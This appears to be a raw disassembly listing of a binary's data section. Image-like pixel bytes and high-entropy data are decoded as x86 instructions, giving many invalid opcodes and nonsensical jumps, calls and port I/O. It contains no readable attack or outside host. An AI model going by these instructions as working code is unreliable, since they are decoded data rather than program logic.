  42efd4:	e2 fe                	loop   0x42efd4
  42efd6:	29 33                	sub    %esi,(%ebx)
  42efd8:	d2 fe                	sar    %cl,%dh
  42efda:	b5 b7                	mov    $0xb7,%ch
  42efdc:	ec                   	in     (%dx),%al
  42efdd:	fe                   	(bad)
  42efde:	da da                	fcmovu %st(2),%st
  42efe0:	da c3                	fcmovb %st(3),%st
  42efe2:	00 00                	add    %al,(%eax)
  42efe4:	00 00                	add    %al,(%eax)
  42efe6:	de da                	(bad)
  42efe8:	d4 6e                	aam    $0x6e
  42efea:	df db                	(bad)
  42efec:	d5 fe                	aad    $0xfe
  42efee:	e1 dd                	loope  0x42efcd
  42eff0:	d7                   	xlat   %ds:(%ebx)
  42eff1:	ff e3                	jmp    *%ebx
  42eff3:	e0 da                	loopne 0x42efcf
  42eff5:	ff e4                	jmp    *%esp
  42eff7:	e1 dc                	loope  0x42efd5
  42eff9:	fe                   	(bad)
  42effa:	e6 e2                	out    %al,$0xe2
  42effc:	de ff                	fdivrp %st,%st(7)
  42effe:	e7 e4                	out    %eax,$0xe4
  42f000:	e0 ff                	loopne 0x42f001
  42f002:	e8 e6 e1 fe ea       	call   0xeb41d1ed
  42f007:	e7 e3                	out    %eax,$0xe3
  42f009:	ff                   	ljmp   (bad)
  42f00a:	eb e9                	jmp    0x42eff5
  42f00c:	e5 ff                	in     $0xff,%eax
  42f00e:	ed                   	in     (%dx),%eax
  42f00f:	eb e8                	jmp    0x42eff9
  42f011:	ff                   	ljmp   (bad)
  42f012:	ef                   	out    %eax,(%dx)
  42f013:	ee                   	out    %al,(%dx)
  42f014:	eb fe                	jmp    0x42f014
  42f016:	f5                   	cmc
  42f017:	f4                   	hlt
  42f018:	f3 ff                	repz (bad)
  42f01a:	fb                   	sti
  42f01b:	fb                   	sti
  42f01c:	fa                   	cli
  42f01d:	fe                   	(bad)
  42f01e:	fa                   	cli
  42f01f:	fa                   	cli
  42f020:	f9                   	stc
  42f021:	ff f6                	push   %esi
  42f023:	f5                   	cmc
  42f024:	f3 ff f5             	repz push %ebp
  42f027:	f3 f2 fe             	repz repnz (bad)
  42f02a:	f6 f5                	div    %ch
  42f02c:	f4                   	hlt
  42f02d:	ff                   	(bad)
  42f02e:	f9                   	stc
  42f02f:	f8                   	clc
  42f030:	f7 ff                	idiv   %edi
  42f032:	f9                   	stc
  42f033:	f8                   	clc
  42f034:	f7 fe                	idiv   %esi
  42f036:	ef                   	out    %eax,(%dx)
  42f037:	ef                   	out    %eax,(%dx)
  42f038:	ef                   	out    %eax,(%dx)
  42f039:	ff b0 b3 eb ff 22    	push   0x22ffebb3(%eax)
  42f03f:	2d d0 fe 47 58       	sub    $0x5847fed0,%eax
  42f044:	e2 ff                	loop   0x42f045
  42f046:	48                   	dec    %eax
  42f047:	53                   	push   %ebx
  42f048:	db ff                	(bad)
  42f04a:	48                   	dec    %eax
  42f04b:	4f                   	dec    %edi
  42f04c:	da fe                	(bad)
  42f04e:	49                   	dec    %ecx
  42f04f:	4f                   	dec    %edi
  42f050:	dc ff                	fdivr  %st,%st(7)
  42f052:	49                   	dec    %ecx
  42f053:	4f                   	dec    %edi
  42f054:	df ff                	(bad)
  42f056:	79 7f                	jns    0x42f0d7
  42f058:	e6 fe                	out    %al,$0xfe
  42f05a:	f8                   	clc
  42f05b:	f8                   	clc
  42f05c:	fc                   	cld
  42f05d:	ff                   	(bad)
  42f05e:	ff                   	(bad)
  42f05f:	ff                   	(bad)
  42f060:	ff                   	(bad)
  42f061:	ff                   	(bad)
  42f062:	ff                   	(bad)
  42f063:	ff                   	(bad)
  42f064:	ff                   	(bad)
  42f065:	ff                   	(bad)
  42f066:	fe                   	(bad)
  42f067:	fe                   	(bad)
  42f068:	fe                   	(bad)
  42f069:	fe                   	(bad)
  42f06a:	ff                   	(bad)
  42f06b:	ff                   	(bad)
  42f06c:	ff                   	(bad)
  42f06d:	ff                   	(bad)
  42f06e:	ff                   	(bad)
  42f06f:	ff                   	(bad)
  42f070:	ff                   	(bad)
  42f071:	ff                   	(bad)
  42f072:	fe                   	(bad)
  42f073:	fe                   	(bad)
  42f074:	fe                   	(bad)
  42f075:	fe                   	(bad)
  42f076:	ff                   	(bad)
  42f077:	ff                   	(bad)
  42f078:	ff                   	(bad)
  42f079:	ff                   	ljmp   (bad)
  42f07a:	ed                   	in     (%dx),%eax
  42f07b:	ee                   	out    %al,(%dx)
  42f07c:	f7 ff                	idiv   %edi
  42f07e:	52                   	push   %edx
  42f07f:	58                   	pop    %eax
  42f080:	bd fe 44 4a d7       	mov    $0xd74a44fe,%ebp
  42f085:	ff 49 4f             	decl   0x4f(%ecx)
  42f088:	dc ff                	fdivr  %st,%st(7)
  42f08a:	48                   	dec    %eax
  42f08b:	4f                   	dec    %edi
  42f08c:	d9 fe                	fsin
  42f08e:	48                   	dec    %eax
  42f08f:	54                   	push   %esp
  42f090:	db ff                	(bad)
  42f092:	47                   	inc    %edi
  42f093:	55                   	push   %ebp
  42f094:	e2 ff                	loop   0x42f095
  42f096:	23 2d cd fe d9 db    	and    0xdbd9fecd,%ebp
  42f09c:	f3 ff ce             	repz dec %esi
  42f09f:	ce                   	into
  42f0a0:	d6                   	salc
  42f0a1:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42f0a2:	00 00                	add    %al,(%eax)
  42f0a4:	00 00                	add    %al,(%eax)
  42f0a6:	df db                	(bad)
  42f0a8:	d5 3d                	aad    $0x3d
  42f0aa:	e0 dc                	loopne 0x42f088
  42f0ac:	d6                   	salc
  42f0ad:	fe                   	(bad)
  42f0ae:	e2 df                	loop   0x42f08f
  42f0b0:	d9 ff                	fcos
  42f0b2:	e4 e1                	in     $0xe1,%al
  42f0b4:	dc ff                	fdivr  %st,%st(7)
  42f0b6:	e6 e2                	out    %al,$0xe2
  42f0b8:	de fe                	fdivrp %st,%st(6)
  42f0ba:	e7 e4                	out    %eax,$0xe4
  42f0bc:	df ff                	(bad)
  42f0be:	e8 e6 e1 ff ea       	call   0xeb42d2a9
  42f0c3:	e7 e3                	out    %eax,$0xe3
  42f0c5:	fe                   	(bad)
  42f0c6:	eb e9                	jmp    0x42f0b1
  42f0c8:	e5 ff                	in     $0xff,%eax
  42f0ca:	ed                   	in     (%dx),%eax
  42f0cb:	eb e8                	jmp    0x42f0b5
  42f0cd:	ff                   	ljmp   (bad)
  42f0ce:	ef                   	out    %eax,(%dx)
  42f0cf:	ee                   	out    %al,(%dx)
  42f0d0:	eb ff                	jmp    0x42f0d1
  42f0d2:	f1                   	int1
  42f0d3:	ef                   	out    %eax,(%dx)
  42f0d4:	ed                   	in     (%dx),%eax
  42f0d5:	fe                   	(bad)
  42f0d6:	f2 f0 ee             	repnz lock out %al,(%dx)
  42f0d9:	ff f3                	push   %ebx
  42f0db:	f2 f0 fe             	repnz lock (bad)
  42f0de:	f6 f5                	div    %ch
  42f0e0:	f3 ff                	repz (bad)
  42f0e2:	fa                   	cli
  42f0e3:	fa                   	cli
  42f0e4:	f9                   	stc
  42f0e5:	ff                   	(bad)
  42f0e6:	fc                   	cld
  42f0e7:	fc                   	cld
  42f0e8:	fc                   	cld
  42f0e9:	fe                   	(bad)
  42f0ea:	fa                   	cli
  42f0eb:	f9                   	stc
  42f0ec:	f9                   	stc
  42f0ed:	ff f7                	push   %edi
  42f0ef:	f6 f5                	div    %ch
  42f0f1:	ff f6                	push   %esi
  42f0f3:	f5                   	cmc
  42f0f4:	f4                   	hlt
  42f0f5:	fe                   	(bad)
  42f0f6:	ed                   	in     (%dx),%eax
  42f0f7:	ec                   	in     (%dx),%al
  42f0f8:	ec                   	in     (%dx),%al
  42f0f9:	ff                   	lcall  (bad)
  42f0fa:	df e0                	fnstsw %ax
  42f0fc:	f5                   	cmc
  42f0fd:	ff 20                	jmp    *(%eax)
  42f0ff:	2a ca                	sub    %dl,%cl
  42f101:	fe 44 4f db          	incb   -0x25(%edi,%ecx,2)
  42f105:	ff 48 50             	decl   0x50(%eax)
  42f108:	d3 ff                	sar    %cl,%edi
  42f10a:	48                   	dec    %eax
  42f10b:	4f                   	dec    %edi
  42f10c:	d6                   	salc
  42f10d:	fe 49 4f             	decb   0x4f(%ecx)
  42f110:	d9 ff                	fcos
  42f112:	80 84 e3 ff f3 f3 fb 	addb   $0xfe,-0x40c0c01(%ebx,%eiz,8)
  42f119:	fe 
  42f11a:	ff                   	(bad)
  42f11b:	ff                   	(bad)
  42f11c:	ff                   	(bad)
  42f11d:	ff                   	(bad)
  42f11e:	ff                   	(bad)
  42f11f:	ff                   	(bad)
  42f120:	ff                   	(bad)
  42f121:	ff 02                	incl   (%edx)
  42f123:	04 b0                	add    $0xb0,%al
  42f125:	cc                   	int3
  42f126:	dc f9                	fdivr  %st,%st(1)
  42f128:	ce                   	into
  42f129:	25 98 ca d6 bc       	and    $0xbcd6ca98,%eax
  42f12e:	69 9e 45 91 78 d8 a7 	imul   $0xcc8665a7,-0x27876ebb(%esi),%ebx
  42f135:	65 86 cc 
  42f138:	bb 85 0a e7 c3       	mov    $0xc3e70a85,%ebx
  42f13d:	c0 96 2b f6 a6 3f 64 	rclb   $0x64,0x3fa6f62b(%esi)
  42f144:	fb                   	sti
  42f145:	92                   	xchg   %eax,%edx
  42f146:	8d 38                	lea    (%eax),%edi
  42f148:	36 ea bc 1c 02 04 06 	ss ljmp $0x306,$0x4021cbc
  42f14f:	03 
  42f150:	1d ca 3d b9 7a       	sbb    $0x7ab93dca,%eax
  42f155:	1f                   	pop    %ds
  42f156:	71 73                	jno    0x42f1cb
  42f158:	90                   	nop
  42f159:	5b                   	pop    %ebx
  42f15a:	22 6b f3             	and    -0xd(%ebx),%ch
  42f15d:	d2 7a 0b             	sarb   %cl,0xb(%edx)
  42f160:	f1                   	int1
  42f161:	24 d2                	and    $0xd2,%al
  42f163:	b1 d5                	mov    $0xd5,%cl
  42f165:	0f 07                	sysret
  42f167:	98                   	cwtl
  42f168:	ee                   	out    %al,(%dx)
  42f169:	4d                   	dec    %ebp
  42f16a:	e5 b6                	in     $0xb6,%eax
  42f16c:	15 9c c3 06 cb       	adc    $0xcb06c39c,%eax
  42f171:	f1                   	int1
  42f172:	ab                   	stos   %eax,%es:(%edi)
  42f173:	e4 a4                	in     $0xa4,%al
  42f175:	59                   	pop    %ecx
  42f176:	d4 3d                	aam    $0x3d
  42f178:	9d                   	popf
  42f179:	2d ba de 93 9c       	sub    $0x9c93deba,%eax
  42f17e:	2e 1a 8c 45 16 25 ef 	sbb    %cs:-0x7110daea(%ebp,%eax,2),%cl
  42f185:	8e 
  42f186:	02 54 3b d6          	add    -0x2a(%ebx,%edi,1),%dl
  42f18a:	f3 97                	repz xchg %eax,%edi
  42f18c:	ed                   	in     (%dx),%eax
  42f18d:	a9 29 3c fa ba       	test   $0xbafa3c29,%eax
  42f192:	04 9a                	add    $0x9a,%al
  42f194:	a0 e8 66 b6 ee       	mov    0xeeb666e8,%al
  42f199:	63 ac 3b 6b 39 9d c4 	arpl   %ebp,-0x3b62c695(%ebx,%edi,1)
  42f1a0:	4f                   	dec    %edi
  42f1a1:	70 ba                	jo     0x42f15d
  42f1a3:	75 0b                	jne    0x42f1b0
  42f1a5:	08 c1                	or     %al,%cl
  42f1a7:	4d                   	dec    %ebp
  42f1a8:	68 26 2e f8 2e       	push   $0x2ef82e26
  42f1ad:	e2 eb                	loop   0x42f19a
  42f1af:	b1 4b                	mov    $0x4b,%cl
  42f1b1:	07                   	pop    %es
  42f1b2:	68 a2 92 32 ae       	push   $0xae3292a2
  42f1b7:	8b f8                	mov    %eax,%edi
  42f1b9:	71 49                	jno    0x42f204
  42f1bb:	f2 f7 b7 b3 8a 95 8a 	repnz divl -0x756a754d(%edi)
  42f1c2:	0e                   	push   %cs
  42f1c3:	21 c4                	and    %eax,%esp
  42f1c5:	e2 20                	loop   0x42f1e7
  42f1c7:	32 99 d7 85 7d 96    	xor    -0x69827a29(%ecx),%bl
  42f1cd:	8b 72 49             	mov    0x49(%edx),%esi
  42f1d0:	35 f2 64 a6 db       	xor    $0xdba664f2,%eax
  42f1d5:	0e                   	push   %cs
  42f1d6:	fd                   	std
  42f1d7:	23 fe                	and    %esi,%edi
  42f1d9:	97                   	xchg   %eax,%edi
  42f1da:	14 36                	adc    $0x36,%al
  42f1dc:	82 e3 25             	and    $0x25,%bl
  42f1df:	c5 31                	lds    (%ecx),%esi
  42f1e1:	96                   	xchg   %eax,%esi
  42f1e2:	42                   	inc    %edx
  42f1e3:	7a d3                	jp     0x42f1b8
  42f1e5:	85 5e a0             	test   %ebx,-0x60(%esi)
  42f1e8:	19 2e                	sbb    %ebp,(%esi)
  42f1ea:	5a                   	pop    %edx
  42f1eb:	56                   	push   %esi
  42f1ec:	28 ca                	sub    %cl,%dl
  42f1ee:	99                   	cltd
  42f1ef:	24 dc                	and    $0xdc,%al
  42f1f1:	d1 f5                	shl    $1,%ebp
  42f1f3:	93                   	xchg   %eax,%ebx
  42f1f4:	dc 1f                	fcompl (%edi)
  42f1f6:	25 df 9e 11 81       	and    $0x81119edf,%eax
  42f1fb:	7c 61                	jl     0x42f25e
  42f1fd:	63 90 f5 62 9a 31    	arpl   %edx,0x319a62f5(%eax)
  42f203:	fd                   	std
  42f204:	bc 13 1e 38 15       	mov    $0x15381e13,%esp
  42f209:	7f db                	jg     0x42f1e6
  42f20b:	52                   	push   %edx
  42f20c:	70 37                	jo     0x42f245
  42f20e:	9f                   	lahf
  42f20f:	5a                   	pop    %edx
  42f210:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42f211:	6c                   	insb   (%dx),%es:(%edi)
  42f212:	16                   	push   %ss
  42f213:	65 9d                	gs popf
  42f215:	80 b3 64 74 6e 14 66 	xorb   $0x66,0x146e7464(%ebx)
  42f21c:	09 64 00 7a          	or     %esp,0x7a(%eax,%eax,1)
  42f220:	91                   	xchg   %eax,%ecx
  42f221:	18 fb                	sbb    %bh,%bl
  42f223:	bf e3 ba d3 2e       	mov    $0x2ed3bae3,%edi
  42f228:	84 e3                	test   %ah,%bl
  42f22a:	fc                   	cld
  42f22b:	f0 d4 06             	lock aam $0x6
  42f22e:	48                   	dec    %eax
  42f22f:	3a fc                	cmp    %ah,%bh
  42f231:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42f232:	43                   	inc    %ebx
  42f233:	fc                   	cld
  42f234:	47                   	inc    %edi
  42f235:	61                   	popa
  42f236:	e7 b9                	out    %eax,$0xb9
  42f238:	95                   	xchg   %eax,%ebp
  42f239:	58                   	pop    %eax
  42f23a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42f23b:	13 c6                	adc    %esi,%eax
  42f23d:	cc                   	int3
  42f23e:	35 18 86 23 eb       	xor    $0xeb238618,%eax
  42f243:	37                   	aaa
  42f244:	ea 27 01 50 66 7e c4 	ljmp   $0xc47e,$0x66500127
  42f24b:	e8 dc 8a b8 e4       	call   0xe4fb7d2c
  42f250:	cb                   	lret
  42f251:	9e                   	sahf
  42f252:	90                   	nop
  42f253:	02 c3                	add    %bl,%al
  42f255:	bb 90 6b 80 f6       	mov    $0xf6806b90,%ebx
  42f25a:	a1 52 3f f4 38       	mov    0x38f43f52,%eax
  42f25f:	b8 54 c0 96 5f       	mov    $0x5f96c054,%eax
  42f264:	14 4a                	adc    $0x4a,%al
  42f266:	1b 27                	sbb    (%edi),%esp
  42f268:	c8 25 b8 97          	enter  $0xb825,$0x97
  42f26c:	6b 3f 63             	imul   $0x63,(%edi),%edi
  42f26f:	7f 84                	jg     0x42f1f5
  42f271:	e4 59                	in     $0x59,%al
  42f273:	8c b9 ed 3c 25 bc    	mov    %?,-0x43dac313(%ecx)
  42f279:	84 5a 2f             	test   %bl,0x2f(%edx)
  42f27c:	c1 6e d4 4e          	shrl   $0x4e,-0x2c(%esi)
  42f280:	7c d0                	jl     0x42f252
  42f282:	98                   	cwtl
  42f283:	01 31                	add    %esi,(%ecx)
  42f285:	98                   	cwtl
  42f286:	eb 9d                	jmp    0x42f225
  42f288:	59                   	pop    %ecx
  42f289:	af                   	scas   %es:(%edi),%eax
  42f28a:	6c                   	insb   (%dx),%es:(%edi)
  42f28b:	ac                   	lods   %ds:(%esi),%al
  42f28c:	97                   	xchg   %eax,%edi
  42f28d:	3a f1                	cmp    %cl,%dh
  42f28f:	91                   	xchg   %eax,%ecx
  42f290:	a2 69 af d5 f4       	mov    %al,0xf4d5af69
  42f295:	10 78 3d             	adc    %bh,0x3d(%eax)
  42f298:	0b c8                	or     %eax,%ecx
  42f29a:	bd ba 58 d8 dc       	mov    $0xdcd858ba,%ebp
  42f29f:	84 18                	test   %bl,(%eax)
  42f2a1:	e1 78                	loope  0x42f31b
  42f2a3:	8b 1c 4f             	mov    (%edi,%ecx,2),%ebx
  42f2a6:	f0 ce                	lock into
  42f2a8:	01 a6 74 25 73 c8    	add    %esp,-0x378cda8c(%esi)
  42f2ae:	06                   	push   %es
  42f2af:	a3 6f 70 f4 77       	mov    %eax,0x77f4706f
  42f2b4:	40                   	inc    %eax
  42f2b5:	e1 3a                	loope  0x42f2f1
  42f2b7:	67 93                	addr16 xchg %eax,%ebx
  42f2b9:	1a 45 49             	sbb    0x49(%ebp),%al
  42f2bc:	3f                   	aas
  42f2bd:	76 bd                	jbe    0x42f27c
  42f2bf:	94                   	xchg   %eax,%esp
  42f2c0:	9a b6 f7 8b 0e ce 19 	lcall  $0x19ce,$0xe8bf7b6
  42f2c7:	6f                   	outsl  %ds:(%esi),(%dx)
  42f2c8:	0a 88 0e 72 95 3b    	or     0x3b95720e(%eax),%cl
  42f2ce:	02 6b 9d             	add    -0x63(%ebx),%ch
  42f2d1:	11 c7                	adc    %eax,%edi
  42f2d3:	10 1a                	adc    %bl,(%edx)
  42f2d5:	c9                   	leave
  42f2d6:	f0 20 74 52 5f       	lock and %dh,0x5f(%edx,%edx,2)
  42f2db:	58                   	pop    %eax
  42f2dc:	24 6d                	and    $0x6d,%al
  42f2de:	84 c5                	test   %al,%ch
  42f2e0:	16                   	push   %ss
  42f2e1:	2c ea                	sub    $0xea,%al
  42f2e3:	62 f3 2d 69 01       	(bad)
  42f2e8:	3f                   	aas
  42f2e9:	fb                   	sti
  42f2ea:	0b bd d4 e2 81 95    	or     -0x6a7e1d2c(%ebp),%edi
  42f2f0:	bc 24 65 2a 3b       	mov    $0x3b2a6524,%esp
  42f2f5:	01 ea                	add    %ebp,%edx
  42f2f7:	35 87 01 68 1f       	xor    $0x1f680187,%eax
  42f2fc:	99                   	cltd
  42f2fd:	f9                   	stc
  42f2fe:	15 be 44 7c 5b       	adc    $0x5b7c44be,%eax
  42f303:	8e d4                	mov    %esp,%ss
  42f305:	c6 42 2d a3          	movb   $0xa3,0x2d(%edx)
  42f309:	b9 53 91 01 39       	mov    $0x39019153,%ecx
  42f30e:	9c                   	pushf
  42f30f:	0a 0d 09 ff b6 86    	or     0x86b6ff09,%cl
  42f315:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42f316:	31 e4                	xor    %esp,%esp
  42f318:	1f                   	pop    %ds
  42f319:	46                   	inc    %esi
  42f31a:	18 0b                	sbb    %cl,(%ebx)
  42f31c:	f6 de                	neg    %dh
  42f31e:	80 24 ff 94          	andb   $0x94,(%edi,%edi,8)
  42f322:	51                   	push   %ecx
  42f323:	89 91 7f 87 af 93    	mov    %edx,-0x6c507881(%ecx)
  42f329:	b8 d7 62 eb 02       	mov    $0x2eb62d7,%eax
  42f32e:	84 7d cf             	test   %bh,-0x31(%ebp)
  42f331:	51                   	push   %ecx
  42f332:	12 40 b9             	adc    -0x47(%eax),%al
  42f335:	55                   	push   %ebp
  42f336:	2b 7b cb             	sub    -0x35(%ebx),%edi
  42f339:	69 e6 48 e2 47 ab    	imul   $0xab47e248,%esi,%esp
  42f33f:	da 7f 89             	fidivrl -0x77(%edi)
  42f342:	c2 fb 3b             	ret    $0x3bfb
  42f345:	ec                   	in     (%dx),%al
  42f346:	2e f8                	cs clc
  42f348:	6f                   	outsl  %ds:(%esi),(%dx)
  42f349:	31 7d 7f             	xor    %edi,0x7f(%ebp)
  42f34c:	e3 85                	jecxz  0x42f2d3
  42f34e:	b0 be                	mov    $0xbe,%al
  42f350:	81 a9 12 bc ef d3 cd 	subl   $0xa2f4eecd,-0x2c1043ee(%ecx)
  42f357:	ee f4 a2 
  42f35a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42f35b:	c5 fe 29             	(bad)
  42f35e:	fc                   	cld
  42f35f:	15 b2 f3 fb d4       	adc    $0xd4fbf3b2,%eax
  42f364:	9c                   	pushf
  42f365:	b0 95                	mov    $0x95,%al
  42f367:	45                   	inc    %ebp
  42f368:	05 77 f2 28 89       	add    $0x8928f277,%eax
  42f36d:	9d                   	popf
  42f36e:	ff 62 9e             	jmp    *-0x62(%edx)
  42f371:	5d                   	pop    %ebp
  42f372:	d3 58 80             	rcrl   %cl,-0x80(%eax)
  42f375:	4f                   	dec    %edi
  42f376:	15 35 ec cd 4c       	adc    $0x4ccdec35,%eax
  42f37b:	81 14 b9 f5 0b 07 e4 	adcl   $0xe4070bf5,(%ecx,%edi,4)
  42f382:	61                   	popa
  42f383:	fe 8d f8 6f 55 b0    	decb   -0x4faa9008(%ebp)
  42f389:	27                   	daa
  42f38a:	13 39                	adc    (%ecx),%edi
  42f38c:	51                   	push   %ecx
  42f38d:	fe                   	(bad)
  42f38e:	ed                   	in     (%dx),%eax
  42f38f:	b7 5a                	mov    $0x5a,%bh
  42f391:	3d 71 f0 7c 77       	cmp    $0x777cf071,%eax
  42f396:	38 15 cc 05 c8 85    	cmp    %dl,0x85c805cc
  42f39c:	ad                   	lods   %ds:(%esi),%eax
  42f39d:	73 f6                	jae    0x42f395
  42f39f:	3e 17                	ds pop %ss
  42f3a1:	17                   	pop    %ss
  42f3a2:	5f                   	pop    %edi
  42f3a3:	a0 1e e4 43 f8       	mov    0xf843e41e,%al
  42f3a8:	fb                   	sti
  42f3a9:	07                   	pop    %es
  42f3aa:	2d 47 52 94 a1       	sub    $0xa1945247,%eax
  42f3af:	1d f4 8d 62 d2       	sbb    $0xd2628df4,%eax
  42f3b4:	e7 1c                	out    %eax,$0x1c
  42f3b6:	cc                   	int3
  42f3b7:	97                   	xchg   %eax,%edi
  42f3b8:	29 f1                	sub    %esi,%ecx
  42f3ba:	18 cd                	sbb    %cl,%ch
  42f3bc:	ee                   	out    %al,(%dx)
  42f3bd:	c2 18 dd             	ret    $0xdd18
  42f3c0:	4c                   	dec    %esp
  42f3c1:	70 5c                	jo     0x42f41f
  42f3c3:	4b                   	dec    %ebx
  42f3c4:	64 38 fc             	fs cmp %bh,%ah
  42f3c7:	98                   	cwtl
  42f3c8:	26 5c                	es pop %esp
  42f3ca:	f0 ca e9 12          	lock lret $0x12e9
  42f3ce:	13 cf                	adc    %edi,%ecx
  42f3d0:	64 79 48             	fs jns 0x42f41b
  42f3d3:	ea 56 06 98 fc ae 63 	ljmp   $0x63ae,$0xfc980656
  42f3da:	5f                   	pop    %edi
  42f3db:	43                   	inc    %ebx
  42f3dc:	09 e6                	or     %esp,%esi
  42f3de:	2b 2e                	sub    (%esi),%ebp
  42f3e0:	e4 dd                	in     $0xdd,%al
  42f3e2:	39 3d 19 49 59 e7    	cmp    %edi,0xe7594919
  42f3e8:	df 5c 99 78          	fistps 0x78(%ecx,%ebx,4)
  42f3ec:	91                   	xchg   %eax,%ecx
  42f3ed:	07                   	pop    %es
  42f3ee:	0d 3f f4 29 15       	or     $0x1529f43f,%eax
  42f3f3:	95                   	xchg   %eax,%ebp
  42f3f4:	2b 7f b3             	sub    -0x4d(%edi),%edi
  42f3f7:	a3 78 36 65 ac       	mov    %eax,0xac653678
  42f3fc:	72 04                	jb     0x42f402
  42f3fe:	40                   	inc    %eax
  42f3ff:	3f                   	aas
  42f400:	32 49 31             	xor    0x31(%ecx),%cl
  42f403:	e7 2b                	out    %eax,$0x2b
  42f405:	0f de f3             	pmaxub %mm3,%mm6
  42f408:	d7                   	xlat   %ds:(%ebx)
  42f409:	b1 4b                	mov    $0x4b,%cl
  42f40b:	f4                   	hlt
  42f40c:	1a d0                	sbb    %al,%dl
  42f40e:	dd 15 00 19 5e a4    	fstl   0xa45e1900
  42f414:	b5 d7                	mov    $0xd7,%ch
  42f416:	31 69 37             	xor    %ebp,0x37(%ecx)
  42f419:	44                   	inc    %esp
  42f41a:	4f                   	dec    %edi
  42f41b:	48                   	dec    %eax
  42f41c:	b5 88                	mov    $0x88,%ch
  42f41e:	94                   	xchg   %eax,%esp
  42f41f:	f4                   	hlt
  42f420:	e2 d6                	loop   0x42f3f8
  42f422:	be 71 b7 7e ee       	mov    $0xee7eb771,%esi
  42f427:	e5 2a                	in     $0x2a,%eax
  42f429:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42f42a:	d9 63 cf             	fldenv -0x31(%ebx)
  42f42d:	20 e9                	and    %ch,%cl
  42f42f:	4f                   	dec    %edi
  42f430:	81 fd 41 c9 03 61    	cmp    $0x6103c941,%ebp
  42f436:	1f                   	pop    %ds
  42f437:	af                   	scas   %es:(%edi),%eax
  42f438:	7e 8e                	jle    0x42f3c8
  42f43a:	06                   	push   %es
  42f43b:	4b                   	dec    %ebx
  42f43c:	b8 63 fc 28 2a       	mov    $0x2a28fc63,%eax
  42f441:	40                   	inc    %eax
  42f442:	3a 44 f4 86          	cmp    -0x7a(%esp,%esi,8),%al
  42f446:	4a                   	dec    %edx
  42f447:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42f448:	9b                   	fwait
  42f449:	95                   	xchg   %eax,%ebp
  42f44a:	68 66 49 3c de       	push   $0xde3c4966
  42f44f:	37                   	aaa
  42f450:	d2 1a                	rcrb   %cl,(%edx)
  42f452:	92                   	xchg   %eax,%edx
  42f453:	f8                   	clc
  42f454:	97                   	xchg   %eax,%edi
  42f455:	f0 dd 01             	lock fldl (%ecx)
  42f458:	65 60                	gs pusha
  42f45a:	6c                   	insb   (%dx),%es:(%edi)
  42f45b:	63 c9                	arpl   %ecx,%ecx
  42f45d:	99                   	cltd
  42f45e:	33 c1                	xor    %ecx,%eax
  42f460:	42                   	inc    %edx
  42f461:	0c a4                	or     $0xa4,%al
  42f463:	dc 25 1e 29 90 62    	fsubl  0x6290291e
  42f469:	1e                   	push   %ds
  42f46a:	e5 80                	in     $0x80,%eax
  42f46c:	87 f1                	xchg   %esi,%ecx
  42f46e:	56                   	push   %esi
  42f46f:	b8 47 8b 06 15       	mov    $0x15068b47,%eax
  42f474:	3e 89 ec             	ds mov %ebp,%esp
  42f477:	8b 4b 77             	mov    0x77(%ebx),%ecx
  42f47a:	c1 4b 7a bd          	rorl   $0xbd,0x7a(%ebx)
  42f47e:	f1                   	int1
  42f47f:	d1 0c 92             	rorl   $1,(%edx,%edx,4)
  42f482:	76 69                	jbe    0x42f4ed
  42f484:	d1 0a                	rorl   $1,(%edx)
  42f486:	3f                   	aas
  42f487:	76 15                	jbe    0x42f49e
  42f489:	ea 08 e1 32 75 05 42 	ljmp   $0x4205,$0x7532e108
  42f490:	9b                   	fwait
  42f491:	30 1b                	xor    %bl,(%ebx)
  42f493:	eb 04                	jmp    0x42f499
  42f495:	3e 49                	ds dec %ecx
  42f497:	fe                   	(bad)
  42f498:	d5 08                	aad    $0x8
  42f49a:	0d 9c aa 5e ad       	or     $0xad5eaa9c,%eax
  42f49f:	52                   	push   %edx
  42f4a0:	ff 90 29 05 d7 f7    	call   *-0x828fad7(%eax)
  42f4a6:	0b a4 4d dd a5 b3 b2 	or     -0x4d4c5a23(%ebp,%ecx,2),%esp
  42f4ad:	8d                   	lea    (bad),%edi
  42f4ae:	fa                   	cli
  42f4af:	2e 8a 05 e3 9a 4f 3b 	mov    %cs:0x3b4f9ae3,%al
  42f4b6:	91                   	xchg   %eax,%ecx
  42f4b7:	ff 53 5f             	call   *0x5f(%ebx)
  42f4ba:	e1 80                	loope  0x42f43c
  42f4bc:	87 3a                	xchg   %edi,(%edx)
  42f4be:	d9 cd                	fxch   %st(5)
  42f4c0:	7e f3                	jle    0x42f4b5
  42f4c2:	47                   	inc    %edi
  42f4c3:	a8 60                	test   $0x60,%al
  42f4c5:	5f                   	pop    %edi
  42f4c6:	6d                   	insl   (%dx),%es:(%edi)
  42f4c7:	bb 70 e5 3d f7       	mov    $0xf73de570,%ebx
  42f4cc:	3d 6a b2 46 a1       	cmp    $0xa146b26a,%eax
  42f4d1:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42f4d2:	6c                   	insb   (%dx),%es:(%edi)
  42f4d3:	5a                   	pop    %edx
  42f4d4:	8a 2f                	mov    (%edi),%ch
  42f4d6:	d9 90 c5 4e d0 64    	fsts   0x64d04ec5(%eax)
  42f4dc:	9c                   	pushf
  42f4dd:	01 fa                	add    %edi,%edx
  42f4df:	4b                   	dec    %ebx
  42f4e0:	61                   	popa
  42f4e1:	6c                   	insb   (%dx),%es:(%edi)
  42f4e2:	f0 36 6e             	lock outsb %ss:(%esi),(%dx)
  42f4e5:	05 13 04 bc f8       	add    $0xf8bc0413,%eax
  42f4ea:	2c 76                	sub    $0x76,%al
  42f4ec:	cf                   	iret
  42f4ed:	bc 93 5d 59 b2       	mov    $0xb2595d93,%esp
  42f4f2:	d6                   	salc
  42f4f3:	23 09                	and    (%ecx),%ecx
  42f4f5:	83 cd 7c             	or     $0x7c,%ebp
  42f4f8:	8b 77 5b             	mov    0x5b(%edi),%esi
  42f4fb:	ff                   	(bad)
  42f4fc:	f9                   	stc
  42f4fd:	57                   	push   %edi
  42f4fe:	0d ba 2c 89 00       	or     $0x892cba,%eax
  42f503:	2b 9b 0a 56 2c b5    	sub    -0x4ad3a9f6(%ebx),%ebx
